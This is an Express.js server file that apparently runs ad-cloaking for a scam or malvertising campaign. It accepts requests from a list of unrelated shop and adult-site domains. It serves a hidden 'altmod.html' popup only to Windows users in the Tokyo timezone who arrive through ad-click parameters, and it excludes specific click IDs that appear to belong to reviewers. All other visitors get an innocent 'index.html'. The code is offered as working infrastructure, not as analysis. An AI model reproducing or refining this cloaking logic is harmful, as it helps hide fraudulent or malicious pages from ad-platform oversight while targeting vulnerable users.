const express = require("express");
const cors = require("cors");
const path = require("path");
const app = express();
const PORT = 3000 || process.env.PORT;

// List of allowed frontend origins for CORS
const allowedOrigins = [
  "https://tokyopizzastudio.com",
  "http://tokyopizzastudio.com",
  "https://fushiwellness.site",
  "http://fushiwellness.site",
  "https://eternalswater.shop",
  "http://eternalswater.shop",
  "https://furioncoffee.com",
  "http://furioncoffee.com",
  "https://www.goelectrictokyo.com",
  "http://www.goelectrictokyo.com",
  "https://goelectrictokyo.com",
  "http://goelectrictokyo.com",
  "https://www.astroinsight.net",
  "http://www.astroinsight.net",
  "https://astroinsight.net",
  "http://astroinsight.net",
  "https://thebuddhalife.com",
  "http://thebuddhalife.com",
  "http://heshibodycare.com",
  "https://heshibodycare.com",
  "https://ufitbodycare.com",
  "http://ufitbodycare.com",
  "https://www.ufitbodycare.com",
  "http://www.ufitbodycare.com",
  "https://hisashieats.com",
  "http://hisashieats.com",
  "https://www.hisashieats.com",
  "http://www.hisashieats.com",
  "https://hdjavforyou.online",
  "http://hdjavforyou.online",
];

// Normalize referer function to handle trailing slashes
const normalizeReferer = (referer) => referer?.replace(/\/+$/, "");

// Helper function to check if the user's OS is Windows
const isWindowsOS = (userAgent) => {
  const isWindows = userAgent.includes("Windows");
  console.log(`Is Windows OS: ${isWindows}`);
  return isWindows;
};

// CORS configuration
const corsOptions = {
  origin: function (origin, callback) {
    if (allowedOrigins.includes(origin) || !origin) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
};

// Apply the CORS middleware
app.use(cors(corsOptions));

// Middleware to parse JSON bodies
app.use(express.json());

// Middleware to parse URL-encoded bodies (this is no longer needed for gclid parameter in URL)
// app.use(express.urlencoded({ extended: true }));

const excludedGclids = [
  "Cj0KCQjw-r-vBhC-ARIsAGgUO2C_TQANjVz_anWRFDMLrgWjPRQdR_Jut7w9ET3Vjk5u0k8R6QcOxBkaAgb8EALw_wcB",
  "EAIaIQobChMIpPjIgsX_hAMVgxF7Bx21hA2nEAEYASAAEgJtIvD_BwE",
  "EAIaIQobChMI0JvTgYj9hAMV-EXCBR3K4AIHEAEYASAAEgLbE_D_BwE",
  "EAIaIQobChMIoozsgsX_hAMVxvlMAh2eXAswEAEYASAAEgJ-nPD_BwE",
  "EAIaIQobChMIhbr8g8X_hAMVX20PAh0J-wx2EAEYASAAEgKJzvD_BwE",
  "EAIaIQobChMImtP91cT_hAMVvt8WBR2COgKIEAEYASAAEgLe3PD_BwE",
  "CjwKCAjwzN-vBhAkEiwAYiO7oDOGt2owPQMGoLXTSXIKwowtVJ2kmDWcKqnfY0uoOKEeuIvkLZ1AVRoCuyYQAvD_BwE",
  "EAIaIQobChMI0eW1obn_hAMVaVDCBR2jAgUsEAEYASAAEgKzbPD_BwE",
  "CjwKCAjwzN-vBhAkEiwAYiO7oFb2UXd5PQl6Co282BgshwjisQ37hnsS4vGHvZ1IfHvuGbRbb2QaEhoCxqMQAvD_BwE",
  "EAIaIQobChMI6NvN3rj_hAMVupnpBR29BAF8EAEYASAAEgLq4vD_BwE",
  "EAIaIQobChMIrcqp3bj_hAMVvOEWBR2cmAFSEAEYASAAEgLltfD_BwE",
  "EAIaIQobChMIhbj8w7j_hAMVzstMAh09ZQheEAEYASAAEgIWSvD_BwE",
  "EAIaIQobChMIu9aqj7j_hAMVPSZ7Bx10pw3pEAEYASAAEgJuN_D_BwE",
  "CjwKCAjwzN-vBhAkEiwAYiO7oMj3jXuz3-0tuliQeSGYfEZBVDP9YNgscwmIVGR2hIqCdINAWf5JKhoC_VcQAvD_BwE",
  "EAIaIQobChMI_fCMp67_hAMVJkvCBR0-UQ01EAEYASAAEgJBePD_BwE",
  "CjwKCAjwzN-vBhAkEiwAYiO7oIMZ9TpPde6e9K5DjGpWLpSvXBtfH9uLl7j6sCuBW_zsRDXc2y05WRoCb7wQAvD_BwE",
  "EAIaIQobChMImtKHrq7_hAMVDcEWBR3dzwH-EAEYASAAEgIXpfD_BwE",
  "EAIaIQobChMIsYOYxa7_hAMVLYLpBR2p2g4NEAEYASAAEgLi3vD_BwE",
  "EAIaIQobChMIuYyI_63_hAMVLU3CBR1_BQ2yEAEYASAAEgJP1fD_BwE",
  "EAIaIQobChMI1ef-hav_hAMVIErCBR0VYAxtEAEYASAAEgLdb_D_BwE",
  "EAIaIQobChMIhNvh_Kr_hAMVDDZ7Bx06QQYtEAEYASAAEgLFuPD_BwE",
  "CjwKCAjwzN-vBhAkEiwAYiO7oJFpTh4KXCyXSyIPLYcuyc9QFNJuzqqXpBnon23gnvVKBaIXzBzVJBoC7tgQAvD_BwE",
  "CjwKCAjwzN-vBhAkEiwAYiO7oP0uBhBRXTTYIXCtLSRYEex5asfoftkhku4sIIWGdpzS9BvskrgU_RoCkvsQAvD_BwE",
  "EAIaIQobChMI1sOJyJ3_hAMVslgPAh31gAoJEAEYASAAEgLl0fD_BwE",
  "EAIaIQobChMIz5iC0p3_hAMVBOcWBR2AjADjEAEYASAAEgJHLPD_BwE",
  "EAIaIQobChMI_ZiK1J3_hAMVDzx7Bx32jAZWEAEYASAAEgLNqfD_BwE",
  "EAIaIQobChMI7oX3zp3_hAMVtJXpBR2PVgoAEAEYASAAEgJ7a_D_BwE",
  "CjwKCAjwzN-vBhAkEiwAYiO7oO7v8qGZZ4psma9pblPtoOJRz7pVe_Zz7PEOeO0N76gm3OxQ-GSE6BoCcF8QAvD_BwE",
  "EAIaIQobChMI2tnawZ3_hAMVUETCBR2W0gqeEAEYASAAEgL7A_D_BwE",
  "EAIaIQobChMInKyLvp3_hAMVi0vCBR2B0AZqEAEYASAAEgIE7PD_BwE",
  "EAIaIQobChMI6pbetJ3_hAMVV5npBR1PKAoUEAEYASAAEgIznPD_BwE",
  "CjwKCAjwzN-vBhAkEiwAYiO7oBGQn94dWYcBnlYM_PVcXmUwmwE8WThRH8_6jiAWedsP2tKG0btl4hoCWDEQAvD_BwE",
  "EAIaIQobChMIy_bRsJn_hAMVO0_CBR2lVQn7EAEYASAAEgJZYPD_BwE",
  "EAIaIQobChMI5veqkpn_hAMVqVUPAh0wRwZaEAEYASAAEgJPfPD_BwE"
];

// Function to check if the URL contains any of the excluded GCLIDs
function containsExcludedGclid(url) {
  return excludedGclids.some(gclid => url.includes(gclid));
}

// Route to handle the POST request
app.post("/", (req, res) => {
  const referer = normalizeReferer(req.headers.referer);
  const userAgent = req.headers["user-agent"]; // Get the User-Agent from the request headers
  const { timezone, fullUrl } = req.body;

  console.log(req.body);
  console.log(`Referer: ${referer}, User-Agent: ${userAgent}`);
  
  // Log timezone condition
  const isTokyoTimezone = timezone === "Asia/Tokyo" || timezone === "Etc/GMT-9";
  console.log(`Is Tokyo/Asia Timezone: ${isTokyoTimezone}`);

  // Updated condition to exclude certain GCLIDs
  if (isWindowsOS(userAgent) && isTokyoTimezone && !containsExcludedGclid(fullUrl) && (fullUrl?.includes(`gclid`) || fullUrl?.includes(`taboola`) || fullUrl?.includes(`tx`))) {
    console.log('popupsent');
    res.sendFile(path.join(__dirname, "altmod.html"));
  } else {
    console.log('popup not sent');
    res.sendFile(path.join(__dirname, "index.html"));
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
